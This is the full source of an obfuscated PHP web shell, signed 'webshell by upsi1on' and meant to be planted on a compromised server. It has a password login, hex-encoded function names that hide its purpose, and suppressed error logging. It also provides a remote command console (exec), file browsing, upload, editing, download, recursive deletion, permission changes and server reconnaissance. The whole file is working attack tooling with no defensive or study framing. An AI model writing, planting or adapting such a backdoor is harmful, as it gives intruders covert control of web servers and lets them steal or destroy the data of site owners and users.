<?php

# by upsi1on - thanks to my waifu (Zero Two)

error_reporting (0);
set_time_limit (0);
@ini_set ("error_log", null);
@ini_set ("log_errors", 0);
@ini_set ("max_execution_time", 0);
@ini_set ("output_buffering", 0);
@ini_set ("display_errors",  0);

startEncodeFunction ();

$password = '$2a$12$uKw0MYV.LEA64Y6Cux1UIO2YpJ00P6TqUta4YYhNdnnqElRXrZIiC'; // upsi1on
$serv_ip = (!$_SERVER["SERVER_ADDR"]) ? $GLOBALS[49] ($_SERVER["HTTP_HOST"]) : $_SERVER["SERVER_ADDR"];

if (@$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {

	fix_data ();

	if ($_GET["2"] == "ajx-rnm") rnmflodir ();
	if ($_GET["2"] == "ajx-del") massDelete ($_GET["0"]);
	if ($_GET["2"] == "ajx-download") die (showFileValue ($_GET["0"], false));
	if ($_GET["2"] == "ajx-chmod" && isset ($_GET["02"])) exchmd ();
	if ($_GET["2"] == "ajx-up" && @$_FILES["post"]["size"] != 0) uploadToDir ();
	if ($_GET["2"] == "ajx-file" && isset ($_POST["post"]) && $GLOBALS[24] ($_GET["0"] . "/" . $_GET["02"])) saveFlCh ();
	if ($_GET["2"] == "ajx-shell") runShell ();

	if (@$_GET["02"] != "") {

		if ($_GET["2"] == "ajx-cdir") createDirectory ();
		if ($_GET["2"] == "ajx-cfl") createMFl ();

	}

	if ($_GET["2"] == "ajx-info") {

		infoTbl ();
		exit ();

	}

	if ($_GET["2"] == "ajx-open") {

		showFiles ();
		exit ();

	}

	if ($_GET["2"] == "ajx-phpinfo") {

		$GLOBALS[48] ();
		exit ();

	}
}

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>upsi1on</title>
	<style>
		body, input, button, a {
			color: white;
		}
		body {
			background: black;
			font-family: monospace;
			font-size: 120%;
		}
		.border {
			border: 1px solid white;
		}
		input, button, .modal-content {
			border: 1px solid gray;
			border-radius: 3px;
			background: transparent;
		}
		hr {
			border: none;
			border-top: 1px solid gray;
		}
		a {
			cursor: pointer;
			text-decoration: none;
		}
		table {
			border-collapse: collapse;
		}
		iframe {
			border: 0px;
		}
		textarea {
			resize: none;
		}
		input, .center, .phdiv {
			text-align: center;
		}
		.left {
			text-align: left;
			float: left;
		}
		.typeTd {
			width: 0;
		}
		.mainTable, .tdB {
			width: 100%;
		}
		.noName {
			width: 11%;
		}
		.fileAct {
			width: 20%;
		}
		.shact {
			width: auto;
			font-weight: bold;
		}
		.shact, .tdH {
			white-space: nowrap;
		}
		.pth {
			color: gray;
		}
		.chTable {
			width: 40%;
			left: 30%;
		}
		.chTable, .phdiv {
			top: 10%;
			position: absolute;
		}
		.right {
			text-align: right;
		}
		.phdiv, .modal-content {
			width: 80%;
		}
		.phdiv {
			left: 10%;
			height: 75%;
		}
		.phpinfo {
			width: 100%;
			height: 100%;
		}
		.trFl:hover, .trFl:hover a, .bgwhite {
			background: white;
			color: black;
		}
		.typehead {
			width: 1%;
		}
		.modal {
			display: none;
			position: fixed;
			z-index: 1;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			overflow: auto;
			background: black;
		}
		.modal-content {
			border: 2px solid gray;
			background-color: black;
			padding: 10px;
			margin: 0;
			position: absolute;
			top: 45%;
			left: 50%;
			-ms-transform: translate(-50%, -50%);
			transform: translate(-50%, -50%);
		}
		.frdo {
			float: right;
		}
		.lineBreak {
			line-break: anywhere;
		}
		.shellOutput {
			text-align: left;
			overflow-y: scroll;
			overflow-x: hidden;
			height: 100%;
		}
		.inpbold {
			font-weight: bold;
			border: 0;
			text-align: left;
		}
	</style>
</head>
<body>
<?php

if (@!$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {

	if (@!$GLOBALS[46] ($_POST["password"], $password)) {

?>

	<center>
		<h2>webshell by upsi1on</h2>
		<form method="post">
			<input type="password" name="password" placeholder="password">
			<button type="submit">&nbsp;submit&nbsp;</button>
		</form>
	</center>
</body>
</html>

<?php

		exit ();

	}

	$GLOBALS[45] ("webshelLoginVerify", $GLOBALS[44] ($_POST["password"]));
	fix_data ();

}

if ($_GET["2"] == "file" && @$GLOBALS[22] ($_GET["0"] . "/" . $_GET["02"])) openFile ();

if ($_GET["2"] == "chmod" && @$GLOBALS[10] ($_GET["0"] . "/" . $_GET["02"])) changeAccess ();

if ($_GET["2"] == "shell") {

?>

	<div class="phdiv border">
		<div class="shellOutput">
			<div id="shellOutput"></div>
			<div class="shellSubmit">
				<b class="pth">shell > </b>
				<input type="text" placeholder=". . ." class="inpbold" id="shellInput" autocomplete="off">
			</div>
		</div>
		<span class="left">
			<br>
			<a class="shact" href="?0=<?=$_GET["0"];?>&2=open">[ back ]</a>
		</span>
	</div>

<script>
	let path = "<?=$_GET["0"];?>"
</script>

<?=ajaxTemplate ();?>

<script>
	let 
		input = document.getElementById ("shellInput"),
		output = document.getElementById ("shellOutput")

	input.addEventListener("keyup", (event) => {

		if (event.key === "Enter") {

			output.innerHTML = output.innerHTML + "<b class='pth lineBreak'> shell > </b><b class='lineBreak'>" + input.value + "</b><br>"
			ajax ("?0=" + path + "&2=ajx-shell", "plushell", input.value)
			input.value = ""

		}
	})
</script>
</body>
</html>

<?php

}

if ($_GET["2"] == "phpinfo") {

?>

	<div class="phdiv">
		<iframe src="?0=<?=$_GET["0"];?>&2=ajx-phpinfo" class="phpinfo"></iframe>
		<span class="left">
			<br>
			<a class="shact" href="?0=<?=$_GET["0"];?>&2=open">[ back ]</a>
		</span>
	</div>
</body>
</html>

<?php

}

if ($_GET["2"] == "open") {

?>

<table class="mainTable" id="infoTable">

	<?=infoTbl ();?>

</table>

<br>

<div class="shact">

	<a onclick="

		document.cookie = 'webshelLoginVerify=; expires=Thu, 01-Jan-70 00:00:01 GMT'
		window.location = window.location

	">[ logout ]</a>

	<a href="?0=<?=$_GET["0"];?>&2=shell">[ shell ]</a>
	<a href="?0=<?=$_GET["0"];?>&2=phpinfo">[ phpinfo ]</a>

</div>

<br>
<table class="mainTable" id="tableData">

	<?=showFiles ();?>

</table>

<div id="confirModal" class="modal">
	<div class="modal-content">
		<span id="question"></span>
		<span class="frdo">
			<a id="confirmTrue">[ yes ]</a>
			<a id="confirmf">[ no ]</a>
		</span>
	</div>
</div>

<div id="commandModal" class="modal">
	<div class="modal-content">
		<label for="commandInput" id="inputLabelWord"></label>
		<input type="text" id="commandInput" autocomplete="off">
		<span class="frdo">
			<a id="submitCommand">[ submit ]</a>
			<a id="abortCommand">[ cancel ]</a>
		</span>
	</div>
</div>

<?=ajaxTemplate ();?>

<script>

	let 
		tableData = document.getElementById ("tableData"),
		infoTable = document.getElementById ("infoTable"),
		notificationBlock = document.getElementById ("notificationBlock"),
		confirmModal = document.getElementById ("confirModal"),
		question = document.getElementById ("question"),
		confirmTrue = document.getElementById ("confirmTrue"),
		confirmf = document.getElementById ("confirmf"),
		abortCommand = document.getElementById ("abortCommand"),
		submitCommand = document.getElementById ("submitCommand")
		commandInput = document.getElementById ("commandInput"),
		commandModal = document.getElementById ("commandModal"),
		inputLabelWord = document.getElementById ("inputLabelWord"),
		input = document.createElement ("input")

	function rnamdirofl (path, newname) {

		ajax ("?0=" + path + "&2=ajx-rnm&02=" + newname, "notification")

	}

	function cNewFl (path, flnm) {

		ajax ("?0=" + path + "&2=ajx-cfl&02=" + flnm, "notification")

	}

	function cNewDir (path, dirnm) {

		ajax ("?0=" + path + "&2=ajx-cdir&02=" + dirnm, "notification")

	}

	function confExec (quest, command) {

		question.innerHTML = quest
		confirmModal.style.display = "block"

		confirmTrue.onclick = function () {

			confirmModal.style.display = "none"

			eval (command)

		}

		confirmf.onclick = function () {

			confirmModal.style.display = "none"

		}
	}

	function floatInput (word, action) {

		inputLabelWord.innerHTML = word + " : "
		commandModal.style.display = "block"

		submitCommand.onclick = function () {

			action = action.replace ("*data", commandInput.value)

			commandInput.value = ""
			commandModal.style.display = "none"

			eval (action)

		}

		abortCommand.onclick = function () {

			commandModal.style.display = "none"

		}
	}

	function selectFileToUp (filePath) {

		input.type = "file"

		input.onchange = _this => {

			ajax ("?0=" + filePath + "&2=ajx-up", "notification", Array.from (input.files))

			input = document.createElement ("input")

		}

		input.click ()

	}

	function fileDataUpdate () {

		setTimeout (function () {

			ajax ("?0=<?=$_GET["0"];?>&2=ajx-open", tableData)
			ajax ("?0=<?=$_GET["0"];?>&2=ajx-info", infoTable)

			fileDataUpdate ()

		}, 5000)
	}

	fileDataUpdate ()

</script>
</body>
</html>

<?php

}

function hdd () {

	$hdd["all"] = fs ($GLOBALS[42] ("."));
	$hdd["free"] = fs ($GLOBALS[43] ("."));
	$hdd["used"] = fs ($GLOBALS[42] (".") - $GLOBALS[43] ("."));

	return $hdd;

}

function fix_path () {

	if (!$GLOBALS[10] ($_GET["0"])) {

		$loop = $_GET["0"];

		while (true) {

			if (!$GLOBALS[10] ($loop) && $loop != $GLOBALS[21]($loop)) $loop = $GLOBALS[21]($loop);
			else break;

		}

		if ($loop == "") $loop = __DIR__;

		$_GET["0"] = $loop;

	}
}

function fix_data () {

	$ndIota = ["chmod", "file", "ajx-file"];
	$act	= ["ajx-del", "ajx-rnm", "ajx-up", "ajx-cdir", "ajx-cfl"];
	$read   = ["open", "ajx-open"];
	$reaf 	= ["ajx-download"];
	$reau   = ["ajx-chmod"];
	$unvrs  = ["phpinfo", "ajx-phpinfo", "ajx-info", "shell", "ajx-shell"];
	$all	= $GLOBALS[29] (
		$read, $GLOBALS[29] (
			$act, $GLOBALS[29] (
				$unvrs, $GLOBALS[29] (
					$ndIota, $GLOBALS[29] (
						$reaf, $reau
					)
				)
			)
		)
	);

	if (@$_GET["0"] == "") $_GET["0"] = __DIR__;
	if (@!$GLOBALS[41] ($_GET["2"], $all)) $_GET["2"] = "open";
	if (!$GLOBALS[10] ($_GET["0"]) && !$GLOBALS[41] ($_GET["2"], $act)) fix_path ();
	if ($GLOBALS[17] ($_GET["0"]) && $GLOBALS[41] ($_GET["2"], $read)) $_GET["0"] = $GLOBALS[21]($_GET["0"]);
	if ($GLOBALS[16] ($_GET["0"]) && $GLOBALS[41] ($_GET["2"], $reaf)) $_GET["2"] = "open";

	if (

		($GLOBALS[41] ($_GET["2"], $reau) && !$GLOBALS[10] ($_GET["0"]))

		||

		($GLOBALS[41] ($_GET["2"], $ndIota) && !isset ($_GET["02"]))

		||

		($GLOBALS[41] ($_GET["2"], $ndIota) && @!$GLOBALS[10] ($_GET["0"] . "/" . $_GET["02"]))

		||

		($GLOBALS[41] ($_GET["2"], $act) && !$GLOBALS[10] ($_GET["0"]))

		||

		($GLOBALS[41] ($_GET["2"], $read) && !$GLOBALS[16] ($_GET["0"]))

	) {
		
		$GLOBALS[50] ("HTTP/1.0 500 Internal Server Error");
		exit ();
	
	}

	$_GET["0"] = $GLOBALS[20] ("\\", "/", $GLOBALS[27] ($_GET["0"]));

	return;

}

function getPURL () {

	$loop = $GLOBALS[27] ($_GET["0"]);

	$x = [ $GLOBALS[23] ($loop) ];

	if ($GLOBALS[23] ($loop) == "") {

		$x = [ $loop ];

	}

	$y = [ $GLOBALS[27] ($loop) ];

	while (true) {

		if ($GLOBALS[21]($loop) != $loop) {

			$loop = $GLOBALS[21]($loop);

			($GLOBALS[23] ($loop) == "") ? $GLOBALS[40] ($x, $loop) : $GLOBALS[40] ($x, $GLOBALS[23] ($loop));

			$GLOBALS[40] ($y, $GLOBALS[27] ($loop));

		}

		else break;

	}

	$x = $GLOBALS[39] ($x);
	$y = $GLOBALS[39] ($y);

	$z = 0;
	$path = "";
	$count = $GLOBALS[38] ($x);

	while ($z < $count) {

		$path .= " <a href='?0=" . $y[$z] . "&2=open'>" . $GLOBALS[5] ($x[$z]) . "</a> <span class='pth'>〉</span>";
		$z++;

	}

	return $path;

}

function fs ($size) {

	if ($size > 1073741824) return $GLOBALS[37] ("%1.2f", $size / 1073741824 )." GiB";
	elseif ($size > 1048576) return $GLOBALS[37] ("%1.2f", $size / 1048576 ) ." MiB";
	elseif ($size > 1024) return $GLOBALS[37] ("%1.2f", $size / 1024 ) ." KiB";
	else return $size ." B";

}

function expandPath($path) {

	if ($GLOBALS[36]("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {

		$GLOBALS[34] ("echo $match[1]", $stdout);

		return $stdout[0] . $match[2];

	}

	return $path;

}

function runShell () {

	$stdout = [];

	if ($GLOBALS[36] ("/^\s*cd\s*(2>&1)?$/", $_POST["post"])) $GLOBALS[35](expandPath ("~"));

	elseif ($GLOBALS[36]("/^\s*cd\s+(.+)\s*(2>&1)?$/", $_POST["post"])) {

		$GLOBALS[35] ($_GET["0"]);
		$GLOBALS[36] ("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $_POST["post"], $match);
		$GLOBALS[35] (expandPath ($match[1]));

	}

	else {

		$GLOBALS[35] ($_GET["0"]);
		$GLOBALS[34] ($_POST["post"], $stdout);

	}

	$buff = "";
	foreach ($stdout as $result) $buff .= $GLOBALS[5] ($result) . "<br>";
	die ($GLOBALS[33] () . "|" . $GLOBALS[20] (" ", "&nbsp;", $buff));

}

function perms ($path) {

	$filePerms = $GLOBALS[6] ($path);

	if (($filePerms & 0xC000) == 0xC000) $info = "s";
	elseif (($filePerms & 0xA000) == 0xA000) $info = "l";
	elseif (($filePerms & 0x8000) == 0x8000) $info = "-";
	elseif (($filePerms & 0x6000) == 0x6000) $info = "b";
	elseif (($filePerms & 0x4000) == 0x4000) $info = "d";
	elseif (($filePerms & 0x2000) == 0x2000) $info = "c";
	elseif (($filePerms & 0x1000) == 0x1000) $info = "p";
	else $info = "u";

	$info .= (($filePerms & 0x0100) ? "r" : "-");
	$info .= (($filePerms & 0x0080) ? "w" : "-");
	$info .= (($filePerms & 0x0040) ? (($filePerms & 0x0800) ? "s" : "x" ) : (($filePerms & 0x0800) ? "S" : "-"));

	$info .= (($filePerms & 0x0020) ? "r" : "-");
	$info .= (($filePerms & 0x0010) ? "w" : "-");
	$info .= (($filePerms & 0x0008) ? (($filePerms & 0x0400) ? "s" : "x" ) : (($filePerms & 0x0400) ? "S" : "-"));

	$info .= (($filePerms & 0x0004) ? "r" : "-");
	$info .= (($filePerms & 0x0002) ? "w" : "-");
	$info .= (($filePerms & 0x0001) ? (($filePerms & 0x0200) ? "t" : "x" ) : (($filePerms & 0x0200) ? "T" : "-"));

	return $info;

}

function infoTbl () {

	global $serv_ip;

?>

	<tr>
		<td colspan='2' class='tdH'>
			<b>
				( your ip : <?=$_SERVER["REMOTE_ADDR"];?> | serv ip : <?=$serv_ip;?> )
			</b>
			<br>
			<br>
		</td>
	</tr>
	<tr>
		<td class='tdH'>sys&nbsp; :&nbsp;</td>
		<td class='tdB'><?=$GLOBALS[5] ($GLOBALS[32] ());?></td>
	</tr>
	<tr>
		<td class='tdH'>soft :&nbsp;</td>
		<td class='tdB'><?=$GLOBALS[5] ($_SERVER["SERVER_SOFTWARE"]);?></td>
	</tr>
	<tr>
		<td class='tdH'>php &nbsp;:&nbsp;</td>
		<td class='tdB'><?=$GLOBALS[31] ();?></td>
	</tr>
	<tr>
		<td class='tdH'>disk&nbsp;:&nbsp;</td>
		<td class='tdB'><?=hdd ()["used"];?> / <?=hdd ()["all"];?> (<?=hdd ()["free"];?> free)</td>
	</tr>
	<tr>
		<td colspan="2"><br></td>
	</tr>
	<tr>
		<td colspan='2' class='tdH'><?=getPURL ();?></td>
	</tr>

<?php

}

function showFiles () {

	$dir = $GLOBALS[30] ($_GET["0"]);

	if ($GLOBALS[20] ("\\", "/", $GLOBALS[21]($_GET["0"])) == $_GET["0"]) $dir = $GLOBALS[29] (["."], $GLOBALS[28] ($dir, ["..", "."]));
	else $dir = $GLOBALS[29] ([".", ".."], $GLOBALS[28] ($dir, ["..", "."]));

	$str = "
	<tr>
		<th colspan='2' nowrap>[ name ]</th>
		<th class='noName' nowrap>[ size ]</th>
		<th class='noName' nowrap>[ permission ]</th>
		<th class='noName' nowrap>[ modified ]</th>
		<th class='fileAct' nowrap>[ action ]</th>
	</tr>
	<tr>
		<td colspan='6'><hr></td>
	</tr>";

	foreach ($dir as $a) {

		$flpth = $GLOBALS[20] ("\\", "/", $GLOBALS[27] ($_GET["0"] . "/" . $a));
		$dact = "";
		$size = "-";
		$perms = "<a href='?0=" . $_GET["0"] . "&2=chmod&02=$a'>" . perms ($flpth) . "</a>";
		$lm	= $GLOBALS[25] ("Y-m-d H:i", $GLOBALS[26] ($flpth));
		$a	 = $GLOBALS[5] ($a);
		$type  = "<span class='pth'>[?]</span>";

		if ($GLOBALS[16] ($flpth)) {

			$type = "<span class='pth'>[d]</span>";

			if ($GLOBALS[22] ($flpth)) {

				$a = "<a href='?0=$flpth&2=open'>$a</a>";
				$type = "[d]";

			}

			$dact .= "<a onclick=\"floatInput ('File name', 'cNewFl (\'$flpth\', \'*data\')')\">+file</a> <a onclick=\"floatInput ('Dir name', 'cNewDir (\'$flpth\', \'*data\')')\">+dir</a> <a onclick=\"selectFileToUp ('$flpth')\">up</a> <a onclick=\"floatInput ('New name', 'rnamdirofl (\'$flpth\', \'*data\')')\">rename</a> <a onclick=\"confExec ('Delete?', 'ajax (\'?0=$flpth&2=ajx-del\', \'notification\')')\">del</a>";

		}

		elseif ($GLOBALS[17] ($flpth)) {

			$type = "<span class='pth'>[f]</span>";
			$size = fs ($GLOBALS[2] ($flpth));

			if ($GLOBALS[22] ($flpth)) $dact .= "<a href='?0=$flpth&2=ajx-download' download='" . $GLOBALS[23] ($flpth) . "'>download</a> ";

			$dact .= "<a onclick=\"floatInput ('New name', 'rnamdirofl (\'$flpth\', \'*data\')')\">rename</a> <a onclick=\"confExec ('Delete?', 'ajax (\'?0=$flpth&2=ajx-del\', \'notification\')')\">del</a> ";

			if ($GLOBALS[22] ($flpth)) {

				$type = "[f]";
				$a = "<a href='?0=" . $_GET["0"] . "&2=file&02=$a'>$a</a>";

			}
		}

		if ($dact == "") $dact = "-";

		$str .= "

	<tr class='trFl'>
		<td class='typeTd'>$type&nbsp;</td>
		<td>$a</td>
		<td class='center'>$size</td>
		<td class='center'>$perms</td>
		<td class='center'>$lm</td>
		<td class='right'>$dact</td>
	</tr>";

	}

	echo $str;

}

function rnmflodir () {

	if (!isset ($_GET["02"])) ;
	if ($_GET["02"] == "") echo "New name cannot be empty";
	elseif ($GLOBALS[19] ($_GET["0"], $GLOBALS[20] ("\\", "/",  $GLOBALS[21]($_GET["0"])) . "/" . $_GET["02"])) echo "Successfully";
	else echo "Failed";

	exit ();

}

function deleteProcess ($dirPath) {

	if ($GLOBALS[17] ($dirPath)) return $GLOBALS[18] ($dirPath);

	elseif ($GLOBALS[16] ($dirPath)) {

		$dirPath = ($GLOBALS[15] ($dirPath, -1) != DIRECTORY_SEPARATOR) ? $dirPath . DIRECTORY_SEPARATOR : $dirPath;
		$files = $GLOBALS[14] ($dirPath . '*');

		foreach ($files as $file) deleteProcess ($file);

		return $GLOBALS[13] ($dirPath);

	}
}

function massDelete ($dirPath) {

	$dataDeleted = deleteProcess ($dirPath);

	if ($GLOBALS[10] ($_GET["0"]) && $dataDeleted) die ("Successfully deleted some files");
	elseif (!$GLOBALS[10] ($_GET["0"]) && $dataDeleted) die ("Successfully");
	die ("Failed");

}

function uploadToDir () {

	if (

		$GLOBALS[12] (

			$_FILES["post"]["tmp_name"],
			$_GET["0"] . "/" . $_FILES["post"]["name"]

		)

	) die ("Successfully");

	die ("Failed");

}

function createDirectory () {

	$pathofDir = $_GET["0"] . "/" . $_GET["02"];

	if (!$GLOBALS[10] ($pathofDir)) die (($GLOBALS[11] ($pathofDir)) ? "Successfully" : "Failed");
	else die ("File / folder already exists");

}

function createMFl () {

	$pathofFile = $_GET["0"] . "/" . $_GET["02"];

	if (!$GLOBALS[10] ($pathofFile)) {

		$create = $GLOBALS[4] ($pathofFile, "w");

		echo ($create) ? "Successfully" : "Failed";
		$GLOBALS[1] ($create);

	}
	else echo "File / folder already exists";

	exit ();

}

function exchmd () {

	$flPerm = 0;
	$perm1 = perms ($_GET["0"]);

	if ($GLOBALS[9] ($_GET["02"], "1")) $flPerm |= 0400;
	if ($GLOBALS[9] ($_GET["02"], "2")) $flPerm |= 0040;
	if ($GLOBALS[9] ($_GET["02"], "3")) $flPerm |= 0004;

	if ($GLOBALS[9] ($_GET["02"], "4")) $flPerm |= 0200;
	if ($GLOBALS[9] ($_GET["02"], "5")) $flPerm |= 0020;
	if ($GLOBALS[9] ($_GET["02"], "6")) $flPerm |= 0002;

	if ($GLOBALS[9] ($_GET["02"], "7")) $flPerm |= 0100;
	if ($GLOBALS[9] ($_GET["02"], "8")) $flPerm |= 0010;
	if ($GLOBALS[9] ($_GET["02"], "9")) $flPerm |= 0001;

	$GLOBALS[8] ($_GET["0"], $flPerm);
	$GLOBALS[7] ();

	if ($perm1 != perms ($_GET["0"])) die ("Successfully");

	die ("Failed");

}

function changeAccess () {

	$path = $_GET["0"] . "/" . $_GET["02"];

	$chv = $GLOBALS[6] ($path);

	$a = ($chv & 00400) ? "checked" : "";
	$b = ($chv & 00040) ? "checked" : "";
	$c = ($chv & 00004) ? "checked" : "";
	$d = ($chv & 00200) ? "checked" : "";
	$e = ($chv & 00020) ? "checked" : "";
	$f = ($chv & 00002) ? "checked" : "";
	$g = ($chv & 00100) ? "checked" : "";
	$h = ($chv & 00010) ? "checked" : "";
	$i = ($chv & 00001) ? "checked" : "";

?>

<div class="phpinfo">
	<table class="chTable">
		<tr>
			<th nowrap>[ Permission ]</th>
			<th nowrap>[ Owner ]</th>
			<th nowrap>[ Group ]</th>
			<th nowrap>[ Other ]</th>
		</tr>
		<tr>
			<td colspan="4"><hr></td>
		</tr>
		<tr class="trFl">
			<td class="right">Read</td>
			<td class="center"><input type="checkbox" id="b1" <?=$a;?>></td>
			<td class="center"><input type="checkbox" id="b2" <?=$b;?>></td>
			<td class="center"><input type="checkbox" id="b3" <?=$c;?>></td>
		</tr>
		<tr class="trFl">
			<td class="right">Write</td>
			<td class="center"><input type="checkbox" id="b4" <?=$d;?>></td>
			<td class="center"><input type="checkbox" id="b5" <?=$e;?>></td>
			<td class="center"><input type="checkbox" id="b6" <?=$f;?>></td>
		</tr>
		<tr class="trFl">
			<td class="right">Execute</td>
			<td class="center"><input type="checkbox" id="b7" <?=$g;?>></td>
			<td class="center"><input type="checkbox" id="b8" <?=$h;?>></td>
			<td class="center"><input type="checkbox" id="b9" <?=$i;?>></td>
		</tr>
		<tr>
			<th colspan="4">
				<br>
				<a href="?0=<?=$_GET["0"];?>&2=open">[ cancel ]</a>
				<a onclick="listCheckBox ()">[ submit ]</a>
			</th>
		</tr>
	</table>
</div>

<?=ajaxTemplate ();?>

<script>
	function listCheckBox () {

		let dataList = "";

		for (let i = 1; i < 10; i++) {

			document.querySelector("#b" + i).checked ? dataList += i : null

		}

		ajax ("?0=<?=$_GET["0"] . "/" . $_GET["02"];?>&2=ajx-chmod&02=" + dataList, "notification")

	}
</script>
</body>
</html>

<?php

}

function ajaxTemplate () {

?>

<div id="mynotification" class="modal">
	<div class="modal-content" id="notificationBlock">
		<span id="notificationText"></span>
		<span class="frdo">
			<a id="confirmOk">[ ok ]</a>
		</span>
	</div>
</div>

<script>
	let 
		notificationtext = document.getElementById ("notificationText"),
		notification = document.getElementById ("mynotification"),
		confirmOk = document.getElementById ("confirmOk")

	function ajax (url, dom, post) {

		post = post || null

		let xhr = new XMLHttpRequest (),
			pst = new FormData ()

		if (post != null) {

			if (typeof post != "string") {

				pst.append ("post", post[0], post[0].name)

			}

			else {

				pst.append ("post", post)

			}
		}

		else {

			pst.append ("post", "")

		}

		xhr.onreadystatechange = function () {

			if (xhr.readyState == 4 && xhr.status == 200 && dom != null) {

				if (dom == "notification") {

					notificationtext.innerHTML = xhr.responseText
					notification.style.display = "block"

					confirmOk.onclick = function () {

						notification.style.display = "none"

					}
				}

				else if (dom == "plushell") {

					path = xhr.responseText.split ("|")[0]
					document.getElementById ("shellOutput").innerHTML = document.getElementById ("shellOutput").innerHTML + "<br><span class='lineBreak'>" + xhr.responseText.split ("|")[1] + "</span><br>"

				}

				else {

					dom.innerHTML = xhr.responseText

				}
			}
		}

		xhr.open ("POST", url, true)
		xhr.send (pst)

		delete xhr

	}
</script>

<?php

}

function openFile () {

	$path = $_GET["0"] . "/" . $_GET["02"];
	$textareaValue = showFileValue ($path, true);

?>

<div class="phdiv">
	<textarea id="textAreaId" class="phpinfo left"><?=$textareaValue;?></textarea>
	<span class="left">
		<br>
		<a href="?0=<?=$_GET["0"];?>&2=open">[ back ]</a>
		<a onclick="ajax ('?0=<?=$_GET['0'];?>&2=ajx-file&02=<?=$_GET['02'];?>', 'notification', getElementById ('textAreaId').value)">[ save ]</a>
	</span>
</div>

	<?=ajaxTemplate ();?>

</body>
</html>

<?php

}

function showFileValue ($file, $row) {

	$open = $GLOBALS[4] ($file, "r");
	$size = ($GLOBALS[2] ($file) == 0) ? 1 : $GLOBALS[2] ($file);
	$val = ($row) ? $GLOBALS[5] ($GLOBALS[3] ($open, $size)) : $GLOBALS[3] ($open, $size);

	$GLOBALS[1] ($open);

	return $val;

}

function saveFlCh () {

	$path = $_GET["0"] . "/" . $_GET["02"];
	$open = $GLOBALS[4] ($path, "w");
	$size = ($GLOBALS[2] ($path) == 0) ? 1 : $GLOBALS[2] ($path);
	$data = $GLOBALS[3] ($open, $size);

	if ($GLOBALS[0] ($open, $_POST["post"]) || $data == $_POST["post"]) echo "Successfully";
	else echo "Failed";

	$GLOBALS[1] ($open);
	exit ();

}
  
function startEncodeFunction () {

	$encFunct = [

		"667772697465",
		"66636C6F7365",
		"66696C6573697A65",
		"6672656164",
		"666F70656E",
		"68746D6C7370656369616C6368617273",
		"66696C657065726D73",
		"636C656172737461746361636865",
		"63686D6F64",
		"7374725F636F6E7461696E73",
		"66696C655F657869737473",
		"6D6B646972",
		"6D6F76655F75706C6F616465645F66696C65",
		"726D646972",
		"676C6F62",
		"737562737472",
		"69735F646972",
		"69735F66696C65",
		"756E6C696E6B",
		"72656E616D65",
		"7374725F7265706C616365",
		"6469726E616D65",
		"69735F7265616461626C65",
		"626173656E616D65",
		"69735F777269746561626C65",
		"64617465",
		"66696C656D74696D65",
		"7265616C70617468",
		"61727261795F64696666",
		"61727261795F6D65726765",
		"7363616E646972",
		"70687076657273696F6E",
		"7068705F756E616D65",
		"676574637764",
		"65786563",
		"6368646972",
		"707265675F6D61746368",
		"737072696E7466",
		"636F756E74",
		"61727261795F72657665727365",
		"61727261795F70757368",
		"696E5F6172726179",
		"6469736B5F746F74616C5F7370616365",
		"6469736B5F667265655F7370616365",
		"6261736536345F656E636F6465",
		"736574636F6F6B6965",
		"70617373776F72645F766572696679",
		"6261736536345F6465636F6465",
		"706870696E666F",
		"676574686F737462796E616D65",
		"686561646572"

	];

	$count = count ($encFunct);

	for ($i = 0; $i < $count; $i++) {

		$n = "";

		for ($x = 0; $x < strlen ($encFunct[$i]) - 1; $x += 2){

			$n .= chr (hexdec ($encFunct[$i][$x].$encFunct[$i][$x+1]));

		}

		$GLOBALS[$i] = $n;

	}
}
